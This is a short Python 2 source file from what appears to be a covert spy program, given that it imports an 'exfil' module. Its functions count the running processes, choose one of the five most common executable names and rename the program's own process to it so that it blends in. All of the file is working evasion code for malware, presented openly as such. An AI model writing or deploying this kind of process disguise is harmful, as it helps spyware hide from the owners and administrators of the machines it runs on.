"""
/*---------------------------------------------------------------------------------------
--  SOURCE FILE:    spyFunctions.py
--
--  PROGRAM:        spyFunctions
--
--  FUNCTIONS:      disguise()
--					getDisguise()
--					setDisguise(disguise)
--
--  DATE:           December 7th, 2014
--
--  DESIGNERS:      Jacob Miner
--
--  PROGRAMMERS:    Jacob Miner
--
--  NOTES:			Contains the disguise functions of the program.
--  
---------------------------------------------------------------------------------------*/
"""

import os
import psutil
import random
import setproctitle
import threading
import exfil

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   disguise()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	disguise()
--
--  RETURNS:  	void
--
--  NOTES:  	A wrapper that gets the disgiuse, then sets it
--  
------------------------------------------------------------------------------*/
"""
def disguise():
	setDisguise(getDisguise())

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   getDisguise()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	getDisguise()
--
--  RETURNS:  	string - the disguised program name
--
--  NOTES:  	makes a list of the top 5 used names in the program list, 
--  			then chooses one at random and returns it
------------------------------------------------------------------------------*/
"""	
def getDisguise():
	pids = psutil.pids()
	processes = {}

	for pid in pids:
		p = psutil.Process(pid)
		name = p.exe()
		if (name in processes and name != ""):
			processes[name] += 1
		else:
			processes[name] = 1

	common = sorted(processes, key = processes.get, reverse = True)
	top5 = common[:5]
	return top5[random.randint(0,4)]

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   setDisguise(disguise)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	setDisguise(disguise)
--					disguise - the name to set the program title to
--
--  RETURNS:  	void
--
--  NOTES:  	uses setproctitle to set the program's name to disguise
--  
------------------------------------------------------------------------------*/
"""	
def setDisguise(disguise):
	setproctitle.setproctitle(disguise)
	print "Cloaked as: " + disguise
